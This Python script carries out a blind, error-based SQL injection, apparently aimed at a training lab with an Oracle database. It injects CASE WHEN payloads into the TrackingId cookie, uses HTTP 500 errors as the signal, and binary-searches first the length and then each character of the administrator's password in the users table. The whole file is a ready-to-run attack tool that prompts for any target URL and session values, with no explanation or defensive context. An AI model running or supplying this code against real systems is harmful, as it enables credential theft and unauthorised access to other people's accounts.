import requests

url = input("Enter the url(with any category): ")
tracking_id = input("Enter the tracking ID: ")
session_id = input("Enter the session ID: ")

s = requests.Session()

def check(payload):
    Tracking_ID = tracking_id + "'||" + payload + "||'"
    cookies = {"TrackingId": Tracking_ID, "session": session_id}
    result = s.get(url, cookies=cookies)
    return result.status_code == 500
    
def find_length():
    low_len = 1
    high_len = 51
    while (low_len < high_len):
        mid_len = (low_len + high_len) // 2        
        payload = f"(SELECT CASE WHEN (LENGTH((SELECT password FROM users WHERE username='administrator'))>{mid_len}) THEN TO_CHAR(1/0) ELSE '' END FROM dual)"
        if check(payload):
            low_len = mid_len + 1
        else:
            high_len = mid_len
    return high_len
        
def find_password(length):
    password = ""

    for i in range(1,length + 1):
        low = 48
        high = 122
        while (low < high):
            mid = (low + high) // 2
            payload = f"(SELECT CASE WHEN (ASCII(SUBSTR((SELECT password FROM users WHERE username='administrator'),{i},1))>{mid}) THEN TO_CHAR(1/0) ELSE '' END FROM dual)"
            if check(payload):
                low = mid + 1
            else:
                high = mid
        password += chr(high)
        print(f"[+] Position {i}: {chr(high)} → {password}")
    return password


if __name__ == "__main__":
    print("Finding length...")
    length = find_length()
    print(f"Password length: {length}")
    print("Finding password...")
    password = find_password(length)
    print(f"Password: {password}")